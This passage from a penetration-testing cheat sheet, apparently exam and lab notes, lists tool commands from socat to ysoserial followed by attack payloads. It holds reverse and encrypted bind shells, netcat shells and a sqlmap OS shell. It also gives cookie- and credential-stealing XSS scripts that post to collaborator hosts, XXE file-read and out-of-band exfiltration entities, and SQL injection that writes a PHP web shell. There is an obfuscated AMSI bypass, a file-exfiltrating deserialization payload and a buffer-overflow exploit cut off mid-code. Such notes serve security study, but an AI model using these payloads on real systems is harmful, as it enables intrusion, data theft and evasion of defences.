- **Connecting to a Remote Server on Port 80**:
  ```bash
  socat - TCP4:<remote server's ip address>:80
  ```

- **Creating a Listener**:
  ```bash
  sudo socat TCP4-LISTEN:443 STDOUT
  ```
- **Create a Reverse Shell**:
  ```bash
  socat TCP:<target_host>:<port> EXEC:/bin/bash
  socat -d -d TCP4-LISTEN:443 STDOUT
  ```
- **Sending a Reverse Shell**:
  ```bash
  socat TCP4:10.11.0.22:443 EXEC:/bin/bash
  ```

- **Forward a Port**:
  ```bash
  socat TCP-LISTEN:<local_port>,fork TCP:<target_host>:<target_port>
  ```
- **Transferring a File**:
  ```bash
  sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
  socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
  ```

- **Setting Up Encrypted Shells**:
  ```bash
  openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 30 -out bind_shell.crt
  cat bind_shell.key bind_shell.crt > bind_shell.pem
  ```
- **Creating Encrypted Bind Shell**:
  ```bash
  sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
  ```

- **Connecting to the Encrypted Bind Shell**:
  ```bash
  socat - OPENSSL:192.168.22.31:443,verify=0 id
  ```

### Spose
- **Running Spose to check for open ports behind the proxy**:
  ```bash
  python3 spose.py --proxy http://192.168.120.223:3128 --target 127.0.0.1
  ```

### Sqlmap
- **Scan a URL for SQL Injection**:
  ```bash
  sqlmap -u <url>
  ```

- **Specify a POST Request**:
  ```bash
  sqlmap -u <url> --data="<POST_data>"
  ```
- **Basic SQL injection test using sqlmap**:
  ```bash
  sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"
  ```

- **Using sqlmap to dump the entire database**:
  ```bash
  sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump --level=3 --risk=3
  ```
  - **Using sqlmap to gain an OS shell on the target server**:
  ```bash
  sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --os-shell
  ```

### Sqsh
- **Start a Session**:
  ```bash
  sqsh -S <server> -U <username> -P <password>
  ```
- **Basic Syntax:Using Windows Authentication (Local User):**:
  ```bash
  sqsh -S <IP> -U <Username> -P <Password> -D <Database>
  sqsh -S <IP> -U .\\<Username> -P <Password> -D <Database>
  ```
- **Running SQL Queries:**:
  ```bash
  sqsh -S <IP> -U .\\<Username> -P <Password> -D <Database>
  1> SELECT 1;
  2> GO
  ```

- **Useful SQL Commands for Enumeration and Reconnaissance**:
  ```bash
  1> SELECT user_name();
  2> GO
  1> SELECT @@version;
  2> GO
  1> SELECT name FROM master.dbo.sysdatabases;
  2> GO
  1> USE master;
  2> GO
  1> SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
  2> GO
  ```
- **List Linked Servers:**:
  ```bash
  1> EXEC sp_linkedservers;
  2> GO
  1> SELECT * FROM sys.servers;
  2> GO
  ```

- **Listing Users and Login Details:**:
  ```bash
  1> SELECT sp.name AS login, sp.type_desc AS login_type, sl.password_hash, 
       sp.create_date, sp.modify_date, 
       CASE WHEN sp.is_disabled = 1 THEN 'Disabled' ELSE 'Enabled' END AS status 
  FROM sys.server_principals sp 
  LEFT JOIN sys.sql_logins sl 
  ON sp.principal_id = sl.principal_id 
  WHERE sp.type NOT IN ('G', 'R') 
  ORDER BY sp.name;
  2> GO
  ```
- ** Privilege Escalation: Creating a User with sysadmin**:
  ```bash
  1> CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!';
  2> GO
  1> sp_addsrvrolemember 'hacker', 'sysadmin';
  2> GO
  ```

### SSH
- **Connect to a Server**:
  ```bash
  ssh <username>@<host>
  ```

- **Run a Command Remotely**:
  ```bash
  ssh <username>@<host> <command>
  ssh tester@10.11.1.101 'nc 192.168.119.174 443 -e /bin/bash'
  ```
- **SSH Local Port Forwarding**:
  ```bash
  ssh -N -L [bind_address:]port:host:hostport [username@address]
  sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 tester@10.11.0.128
  sudo ssh -N -L 0.0.0.0:445:Win-goal-ip:445 tester@victim-vm-ip
  
  ```

- **SSH Remote Port Forwarding**:
  ```bash
  ssh -N -R [bind_address:]port:host:hostport [username@address]
  ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4
  ssh -R 5555:localhost:5555 tester@192.168.166.52 -p 2222 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"
  
  ```
- **SSH Dynamic Port Forwarding (SOCKS Proxy)**:
  ```bash
  cat /etc/proxychains.conf --> add -->
  [ProxyList]
  # add proxy here ...
  # meanwhile
  # defaults set to "tor"
  socks4 127.0.0.1 8080
  ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>
  sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128
  --> sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110
  ```

- **Windows-Specific Remote Port Forwarding**:
  ```bash
  ssh -R 1088 kali@ip --> SSH
  ```
- **SSH Key Management**:
  ```bash
  mkdir keys
  cd keys
  ssh-keygen
  cat id_rsa.pub
  ```

- **Importing the Public Key with Restrictions**:
  ```bash
  from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxO27JE5uXiHqoUUb4j9o/IPHxsPg+fflPKW4N6pK0ZXSmMfLhjaHyhUr4auF+hSnF2g1hN4N2Z4DjkfZ9f95O7Ox3m0oaUgEwHtZcwTNNLJiHs2fSs7ObLR+gZ23kaJ+TYM8ZIo/ENC68Py+NhtW1c2So95ARwCa/Hkb7kZ1xNo6f6rvCqXAyk/WZcBXxYkGqOLut3c5B+++6h3spOPlDkoPs8T5/wJNcn8i12Lex/d02iOWCLGEav2V1R9xk87xVdI6h5BPySl35+ZXOrHzazbddS7MwGFz16coo+wbHbTR6P5fF9Z1Zm9O/US2LoqHxs7OxNq61BLtr4I/MDnin www-data@hostname

  ```
- **Secure Tunnel with the Attacker Machine**:
  ```bash
  ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@10.11.0.4
  ```

- ** Adding Public Key to Authorized Keys**:
  ```bash
  ssh-keygen
  cat:~/.ssh/id_rsa.pub
  echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD... kali@kali" > /root/.ssh/authorized_keys
  ```
- **Forcing Specific SSH Algorithms**:
  ```bash
  ssh -oKexAlgorithms=+diffie-hellman-group1-sha1,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1 -oHostKeyAlgorithms=+ssh-dss,ssh-rsa  tester@10.11.1.252 -p 22000 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"
  ```

### Steghide
- **Embed Data in a File**:
  ```bash
  steghide embed -cf <cover_file> -ef <embed_file>
  ```

- **Extract hidden data from a JPG image using Steghide**:
  ```bash
  steghide extract -sf <stego_file>
  steghide --extract -sf trytofind.jpg
  ```

### SVN
- **Check Out a Repository**:
  ```bash
  svn checkout <repo_url>
  ```

- **Commit Changes**:
  ```bash
  svn commit -m "<message>"
  ```
- **View the commit logs of the SVN repository with the provided username and password**:
  ```bash
  svn log --username admin --password admin http://192.168.120.73/svn/dev/
  ```

- **Compare the current revision (3) to the first revision (1) in the SVN repository**:
  ```bash
  svn diff -r 3:1 --username admin --password admin http://192.168.120.73/svn/dev/
  ```
- **Compare the current revision (3) to the second revision (2) in the SVN repository**:
  ```bash
  svn diff -r 3:2 --username admin --password admin http://192.168.120.73/svn/dev/
  ```

### Tail
- **View the End of a File**:
  ```bash
  tail <file>
  ```

- **Follow File Changes**:
  ```bash
  tail -f <file>
  ```
- **Monitor Apache access log in real-time using tail**:
  ```bash
  sudo tail -f /var/log/apache2/access.log
  ```



### Tar
- **Create a Tar Archive**:
  ```bash
  tar -cvf <archive.tar> <files>
  ```

- **Extract a Tar Archive**:
  ```bash
  tar -xvf <archive.tar>
  tar -zxvf accesslog.gz 
  tar xvfj accesslog.tar.bz2
  ```

### Tasklist
- **List All Processes**:
  ```cmd
  tasklist
  ```

- **Filter by Name**:
  ```cmd
  tasklist /FI "IMAGENAME eq <process_name>"
  ```
- **Display all running processes along with their services**:
  ```cmd
  tasklist /svc
  ```

- **Display running processes by the SYSTEM account that are currently active**:
  ```cmd
  tasklist /fi "USERNAME eq NT AUTHORITY\SYSTEM" /fi "STATUS eq running"
  ```
- ** Filter to display processes with the name 'cmd.exe'**:
  ```cmd
  tasklist /fi "imagename eq cmd.exe"  # View processes named 'cmd.exe'
  ```

### Terminal
- **Open a New Terminal Tab**:
  ```bash
  gnome-terminal --tab
  ```
- ** Setting Proxy for the Terminal**:
  ```bash
  export https_proxy="http://intern.com:3128"
  export http_proxy="http://intern.com:3128"
  ```

### TheHarvester
- **Gather Information about a Domain**:
  ```bash
  theharvester -d <domain> -l 500 -b google
  ```

### Tr
- **Translate Characters**:
  ```bash
  echo <string> | tr <set1> <set2>
  ```

- **Delete Characters**:
  ```bash
  echo <string> | tr -d <chars>
  ```
- **Remove newline characters from a file**:
  ```bash
  cat test | tr -d '\n'
  ```

### UFW
- **Allow a Port**:
  ```bash
  ufw allow <port>
  ```

- **Check UFW Status**:
  ```bash
  ufw status
  ```
- **List available application profiles in UFW**:
  ```bash
  sudo ufw app list
  ```

- **Show detailed information about the SSH application profile**:
  ```bash
  sudo ufw app info SSH
  ```
- ** Allow SSH traffic through the firewall**:
  ```bash
  sudo ufw allow SSH
  ```
- **Enable the UFW firewall**:
  ```bash
  sudo ufw enable
  ```

### Uname
- **Print System Information**:
  ```bash
  uname -a
  ```

- **Print Kernel Name**:
  ```bash
  uname -s
  ```
- **Display the version of the operating system**:
  ```bash
  uname -v
  ```
- **Display the kernel release version**:
  ```bash
  uname -r
  ```

### Watch
- **Run a Command Repeatedly**:
  ```bash
  watch <command>
  ```

- **Highlight Changes**:
  ```bash
  watch -d <command>
  ```
- **Monitor system resource usage with 'w' command, refreshing every 5 seconds**:
  ```bash
  watch -n 5 w
  ```
- ** Continuously monitor the status of files in a directory (ignoring certain paths) every second, highlighting differences**:
  ```bash
  watch -n 1 -d "find . -! -path './hooks/*' -! -path './info/*' | sort"
  ```
  -n option: every second, -d option: highlights the differences between the previous and the current output
### WC
- **Count Lines in a File**:
  ```bash
  wc -l <file>
  ```

- **Count Words in a File**:
  ```bash
  wc -w <file>
  ```
- **Count the number of characters in test.txt**:
  ```bash
  wc -m < test.txt
  ```
- **Count the number of files and directories in the current directory**:
  ```bash
  ls -l | wc -l
  ```

### Webservers
- **Start a Simple Python Web Server using Python 2**:
  ```bash
  python -m SimpleHTTPServer  <port>
  ```
- **Start a Simple Python Web Server using Python 3**:
  ```bash
  python -m http.server <port>
  ```
- **Start a Simple PHP Web Server**:
  ```bash
  php -S 0.0.0.0:8000
  ```
- **Start a Simple Ruby Web Server**:
  ```bash
  ruby -run -e httpd . -p 9000
  ```
- **Start a Simple BusyBox Web Server**:
  ```bash
  busybox httpd -f -p 10000
  ```

### WFuzz
- **Fuzz a URL**:
  ```bash
  wfuzz -c -z file,<wordlist> --hc 404 <url>/FUZZ
  ```

- **Fuzz POST Data**:
  ```bash
  wfuzz -c -z file,<wordlist> -d "param=FUZZ" <url>
  ```
- **User Enumeration with Password Reset Function:**:
  ```bash
  wfuzz -c -L -u "<URL>/ResetPasswordController.php" -d "email=FUZZ@test.local&Submit=" -b "PHPSESSID=FUZZ" -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt --hs
  ```
  
### Whois
- **Query Domain Information**:
  ```bash
  whois <domain>
  ```
- **Query Domain Information Using a Specific WHOIS Server**:
  ```bash
  whois <domain>  -h <IP>
  ```
  This command queries domain information but specifies an external WHOIS server using the -h option.
- **Reverse Whois Lookup**:
  ```bash
  whois <IP> -h <IP>
  ```
  This command performs a reverse lookup by providing an IP address, allowing you to gather information about the domain or entity associated with the IP.
### Wpscan

- **Scan a WordPress Site**:
  ```bash
  wpscan --url <site_url>
  ```

- **Brute-Forcing the User Credentials**:
  ```bash
  wpscan --url http://192.168.217.52/ -U tester -P /usr/share/wordlists/rockyou.txt
  ```

- **basic Enumeration**:
  ```bash
  wpscan --url vulnserver.local --enumerate ap,at,cb,dbe
  ```

- **Plugins Enumeration**:
  ```bash
  wpscan --url http://blogger.thm/assets/fonts/blog/ --plugins-detection aggressive
  wpscan --url <site_url> --enumerate p
  ```

### Xfreerdp
- **Connect to an RDP Server**:
  ```bash
  xfreerdp /u:<username> /p:<password> /v:<host>
  ```
- **Connecting to the host with xfreerdp**:
  ```bash
  xfreerdp /d:sandbox /u:tester /v:10.10.10.10 +clipboard
  ```

- **Connecting and sharing a folder**:
  ```bash
  xfreerdp /d:sandbox /u:tester /v:10.5.5.20 /drive:/root/oscp/temp /dynamic-resolution +clipboard
  ```

### Xxd
- **Create a Hex Dump**:
  ```bash
  xxd <file>
  ```

- **Revert a Hex Dump to Binary**:
  ```bash
  xxd -r <hex_file>
  ```
- **Hex Dump a File Byte by Byte**:
  ```bash
  xxd -g 1 file
  ```
  The `xxd` command with the `-g 1` flag generates a hex dump of the file, splitting each byte into its own column. This is useful for analyzing files at a very granular level or for debugging binary data.


### Ysoserial

- **Generate a Payload**:
  ```bash
  java -jar ysoserial.jar <payload_type> "<command>"
  ```

  Use the `ysoserial` tool to generate serialized payloads for exploitation or testing. Replace `<payload_type>` with the appropriate payload and `<command>` with the command to execute.

- **Delete a File**:
  ```bash
    java -jar path/to/ysoserial.jar CommonsCollections4 'rm /home/test/test.txt' | base64
    ```
    This example generates a serialized payload using the `CommonsCollections4` exploit, which deletes the `test.txt` file from the specified directory. The payload is then encoded in Base64 for transmission.

- **Exfiltrate a Secret File**:
  ```bash
    java -jar /oscp/Cassios/ysoserial-all.jar CommonsCollections6 'wget --post-file=/home/test/secret fakeserver.local' | gzip -f | base64 -w0
    ```
    This example creates a payload using the `CommonsCollections6` exploit to exfiltrate the `secret` file from the target. It sends the file as a POST request to a remote server using `wget`. The payload is compressed with `gzip` and encoded in Base64 for delivery.


---

## Payloads

### Cross-Site Scripting (XSS) Payloads
- **XSS Attack**:
  ```html
  <script>alert('XSS Attack');</script>
  ```
- **XSS most known tricks and attacks**
  ```html
  #payloads

  <iframe src="https://vulnearble-site.com/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>		//DOM XSS in jQuery selector sink using a hashchange event (Exploit-Server)
  "onmouseover="alert(1)												
  javascript:alert(1)
  '-alert(1)-'
  "></select><img%20src=1%20onerror=alert(1)>
  {{$on.constructor('alert(1)')()}}							//AngularJS expression with angle brackets and double quotes HTML-encoded	
  \"-alert(1)}//
  \'-alert(1)//
  </script><script>alert(1)</script>
  foo?&apos;-alert(1)-&apos;
  ${alert(1)}
  
  
  #Cookie Straling: An XSS payload to steal cookies
  <script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>
  
  
  #Exploit Server:
  //1-PostMessages
  <iframe src="https://0a1000080333edd5c0964033005400b9.web-security-academy.net/" onload=' this.contentWindow.postMessage("<img src=https://v62ftvfm3278074yfn9mdkh5iwoncd02.oastify.com/?cookie"+document.cookie+" onerror=alert(1); >"+document.cookie,"*") '>
  <iframe src="https://0a1000080333edd5c0964033005400b9.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=alert(1)>","*")'>
  
  //2-PostMessages
  <iframe id="samFrame" img src="https://0a3a000c04aa33b7c1297603007500ac.web-security-academy.net/" width="640" height="640"></iframe>
  
  <script>
  document.getElementById("samFrame").onload = function() {onloadFunct()};
  
  function onloadFunct  () {
  document.getElementById("samFrame").contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:javascript:fetch('https://hzkzogy29vgtb605a6tk0j86xx3orff4.oastify.com/?cookie='+document.cookie)\"}","*");
  }
  
  </script>
  
  #This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server.					
  <script>
  fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
  method: 'POST',
  mode: 'no-cors',
  body:document.cookie
  });
  </script>
  
  #This script will make anyone who views the comment issue a POST request containing their username and password to your subdomain of the public Collaborator server.
  <input name=username id=username>
  <input type=password name=password onchange="if(this.value.length)fetch('https://nrixqc1u2sdfnvl1am6p5sr6vx1opgd5.oastify.com',{
  method:'POST',
  mode: 'no-cors',
  body:username.value+':'+this.value
  });">
  
  #Exploiting XSS to perform CSRF
  #This will make anyone who views the comment issue a POST request to change their email address to
  <script>
  var req = new XMLHttpRequest();
  req.onload = handleResponse;
  req.open('get','/my-account',true);
  req.send();
  function handleResponse() {
      var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
      var changeReq = new XMLHttpRequest();
      changeReq.open('post', '/my-account/change-email', true);
      changeReq.send('csrf='+token+'&email=test@test.com')
  };
  </script>
  
  <xss id=x onfocus=alert(document.cookie) tabindex=1>#x';				//custom tags to bypass waf
  <svg><animatetransform%20§§=1>								//cheat sheet check
  "><svg><animatetransform%20onbegin=alert(1)>
  
  #Reflected XSS in canonical link tag(To assist with your exploit, you can assume that the simulated user will press the following key combinations: Alt+X CTRL+ALT+X) ALT+SHIFT+X
  https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
  
  #XSS: Cookie redirect
  <script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
  
  #DOM XSS with postmessage
  #ON the Exploit Server
  <iframe src="https://0a19008a0387c880c0c74013009f0065.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
  
  %3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
  <svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
  postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
  postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
  search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
  search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27			//Bypassing CSP
  Comment=<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
  Comment=<form id=x tabindex=0 onfocus=print()><input id=attributes>
  <img src=1 oNeRrOr=alert`1`>
  <img src=1 onerror='alert(1)'>
  
  
  #Using an iframe to deliver an XSS payload
  <iframe src=http://10.11.0.4/report height="0" width="0"></iframe>
  
  #Using Netcat to receive a XSS request
  sudo nc -nvlp 80
  ```


### XML External Entity (XXE) / XML Payloads
- **XML External Entity (XXE) Injection**:
  ```xml
  <!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <root>&xxe;</root>
  ```

- **XML Injection**:
  ```xml
  <user><name>admin' or '1'='1</name></user>
  ```
- **Basic Exploiting XXE Using External Entities to Retrieve Files**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
<productId>&xxe;</productId>
<storeId>1</storeId>
</stockCheck>
```

- **Exploiting XXE to Perform SSRF Attacks**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/admin"> ]>
<stockCheck>
<productId>&xxe;</productId>
<storeId>1</storeId>
</stockCheck>
```

- **Blind XXE with Out-of-Band Interaction**:
```xml
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
...
&xxe;
```

- **Blind XXE with Out-of-Band Interaction via XML Parameter Entities**:
```xml
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
```

- **Exploiting Blind XXE to Exfiltrate Data Using a Malicious External DTD**:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://716a3zyakekbtzc9ndo3y91uzl5ct7hw.oastify.com/?x=%file;'>">
%eval;
%exfil;
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```

- **Exploiting XInclude to Retrieve Files**:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

- **Exploiting XXE via Image File Upload**:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

- **Exploiting XXE to Retrieve Data by Repurposing a Local DTD**:
```xml
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

- **PHP Filters with XXE to Read the Source Code of Files on the Webserver**:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=info.php" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```
### SQL Injection (SQLi) Payloads
- **SQL Injection**:
  ```sql
  ' OR 1=1 --
  ```

- **Blind SQL Injection**:
  ```sql
  ' AND IF(1=1,SLEEP(5),0)--
  ```
- **Sample query with LIMIT statement**:
  ```sql
  ' or 1=1 LIMIT 1;#
  ```

- **From SQL Injection to Code Execution**:
  ```sql
  #A SQL injection payload using the load_file function
  #A SQL injection payload to write a PHP shell using the OUTFILE function
  http://10.11.0.22/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
  http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
  http://10.11.0.22/backdoor.php?cmd=id

  ```
- **SQL Injection various payloads**:
  ```sql
  ' --
  '#
  ''
  %27--									//  '-- urlencoded 
  %27%23									// '#  urlencoded
  ' union select Null,'A',Null --
  ' union select username,password from users --
  ' union select Null,username||'~'||password from users--		//retrieving multiple values in a single column
  'union select Null,Null from dual--					//oracle
  'union select  Null,banner FROM v$version--				//querying the database type and version on Oracle
  'union select Null,@@version#						//querying the database type and version on MySQL and Microsoft
  'union select @@version,null--
  'union select version(),null--										//postgresql
  'union select table_name,null  from information_schema.tables						//postgresql
  '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--					//postgresql
  '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_fbfqft'-- 	//postgresql
  '+union+select+username_ysxmhu,password_dlwxhb+from+users_fbfqft--					//postgresql
  'union select null,null from dual--									//Oracle
  ' union select table_name,null FROM all_tables--							//Oracle
  ' union select column_name,null from all_tab_columns where table_name='USERS_HPFCUW'--			//Oracle
  'union select PASSWORD_PTFGTC,USERNAME_WANPPW from USERS_HPFCUW--					//Oracle
  a" UNION SELECT LOAD_FILE('/etc/passwd'),2,3,4 as result -- -
  a" UNION SELECT group_concat(user),group_concat(password),group_concat(authentication_string),4 FROM mysql.user -- -
  1 union all select 1, 2, 3
  '1 union all select 1, 2, 3 --
  ```

- **Blind SQL injection with conditional responses/errors**:
  ```sql
  TrackingId=xyz' AND '1'='1		
  TrackingId=xyz' AND '1'='2
  TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
  TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
  TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
  TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>6)='a
  TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
  TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
  TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='§a§
  TrackingId=xyz'
  TrackingId=xyz''
  TrackingId=xyz'||(SELECT '')||'
  TrackingId=xyz'||(SELECT '' FROM dual)||'
  TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
  TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
  TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
  TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
  TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
  TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
  TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
  ```
- **Blind SQL injection with time delays and information retrieval**:
  ```sql
  TrackingId=x'||pg_sleep(10)--												
  TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
  TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
  TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
  TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
  TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
  TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

  ```

- **Blind SQL injection with out-of-band interaction**:
  ```sql
  TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//mndds9r47gg72qlar938g6csajga40sp.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--	
  TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--

  ```
- **SQL injection with filter bypass via XML encoding  (Hackvertor)**:
  ```sql
   <@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities>

  ```
### Antivirus (AV) Bypass
- **AV Bypass Example**:
  ```bash
  echo 'This is a test' > test.exe
  ```
- **Bypass AMSI oneliner**:
  ```bash
  [Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)

  ```


### Buffer Overflow (BOF) Linux (LIN)
- **BOF Linux Example**:
  ```bash
  python -c "print 'A' * 5000" | nc -v 127.0.0.1 80
  ```
- **Launching the debugger via terminal**:
  ```python
  edb
  ```

- **Proof of concept code to crash the Crossfire application**:
  ```python
  #!/usr/bin/python
  import socket
  
  host = "10.11.0.128"
  
  crash = "\x41" * 4379
  
  buffer = "\x11(setup sound " + crash + "\x90\x00#"
  
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  print "[*]Sending evil buffer..."
  
  s.connect((host, 13327))
  print s.recv(1024)
  
  s.send(buffer)
  s.close()
  
  print "[*]Payload Sent !"
  ```

- **Controlling EIP: Creating a unique buffer string using msf-pattern_create and Obtaining the overwrite offset**:
  ```bash
  msf-pattern_create -l 4379
  msf-pattern_offset -q 46367046
  ```

- **Locating Space for Our Shellcode and Obtaining first stage shellcode opcodes**:
  ```bash
  msf-nasm_shell
  nasm > add eax,12
  00000000  83C00C            add eax,byte +0xc
  
  nasm > jmp eax
  00000000  FFE0              jmp eax
  ```

- **Adding the first stage payload**:
  ```bash
  padding = "\x41" * 4368
  eip = "\x42\x42\x42\x42"
